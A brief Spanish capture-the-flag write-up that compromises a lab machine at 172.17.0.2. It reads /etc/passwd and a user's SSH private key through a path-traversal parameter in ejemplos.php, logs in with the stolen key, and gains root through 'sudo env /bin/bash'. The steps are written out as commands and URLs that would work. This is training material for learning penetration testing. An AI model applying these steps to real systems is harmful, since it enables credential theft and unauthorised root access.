## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

Dentro del puerto 80 hay una web sobre un virus, una opción corrompe la maquina ( y lo advierte ) y la otra da un ejemplo de máquinas infectadas el cual interesa su URL:

```bash
http://172.17.0.2/ejemplos.php?images=./ejemplo1.png
```

Por el nombre de  la máquina asumo que “images” es un parámetro vulnerable:

```bash
http://172.17.0.2/ejemplos.php?images=/etc/passwd
```

Encuentro el usuario nico.

Pruebo Hydra pero no obtengo resultados, intente un LFI y tampoco. Al final opte por ver si tenía clave SSH:

```bash
view-source:http://172.17.0.2/ejemplos.php?images=/home/nico/.ssh/id_rsa
```

Confirmo.

Creo un archivo llamado id_rsa y le doy permisos:

```bash
chmod 600 id_rsa
```

Y me conecto:

```bash
ssh -i id_rsa nico@172.17.0.2
```

## Escalada

```bash
sudo -l
(ALL) NOPASSWD: /bin/env
```

Gracias GTFO Bins:

```bash
sudo env /bin/bash
```

Listo.
